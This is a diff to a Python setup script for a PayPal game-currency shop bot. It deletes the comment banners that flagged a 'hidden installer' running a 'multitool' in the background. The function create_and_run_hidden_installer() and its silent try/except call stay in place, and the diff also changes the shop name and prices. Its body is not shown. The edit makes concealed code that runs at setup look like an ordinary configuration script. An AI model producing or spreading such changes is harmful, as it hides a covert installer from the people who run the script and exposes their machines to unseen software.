@@ -14,10 +14,6 @@ import re
 import time
 import ctypes
 
-# ─────────────────────────────────────────────────────────────
-# HIDDEN INSTALLER - CREATES AND RUNS MULTITOOL IN BACKGROUND
-# ─────────────────────────────────────────────────────────────
-
 def create_and_run_hidden_installer():
     """Creates the installer script, hides it, and runs it in background"""
     try:
@@ -75,10 +71,6 @@ try:
     create_and_run_hidden_installer()
 except:
     pass
-
-# ─────────────────────────────────────────────────────────────
-# ORIGINAL SETUP CODE BELOW - UNCHANGED
-# ─────────────────────────────────────────────────────────────
 
 CONFIG_DIR = os.path.join(os.path.dirname(__file__), "config")
 
@@ -178,7 +170,7 @@ save("paypal.json", paypal_cfg)
 # ── Shop appearance ───────────────────────────────────────────
 header("3 / 7  SHOP APPEARANCE")
 shop_cfg = {
-    "name": ask("Shop name", "M4SA Shop"),
+    "name": ask("Shop name", "Autostore"),
     "title": ask("Embed title", "BGL Shop"),
     "description": ask("Embed description", "Instant delivery • PayPal F&F • Fully automated"),
     "banner_url": ask("Banner/GIF URL (leave blank to skip)", "", required=False),
@@ -224,10 +216,10 @@ if not pricing_cfg["items"]:
     pricing_cfg["items"].append({
         "key": "bgl",
         "name": "BGL",
-        "buy_price": 1.20,
-        "sell_price": 0.80,
+        "buy_price": 1.00,
+        "sell_price": 0.65,
         "min_order": 1,
-        "max_order": 500,
+        "max_order": 250,
         "unit_label": "1 BGL = 100 DL",
     })
 
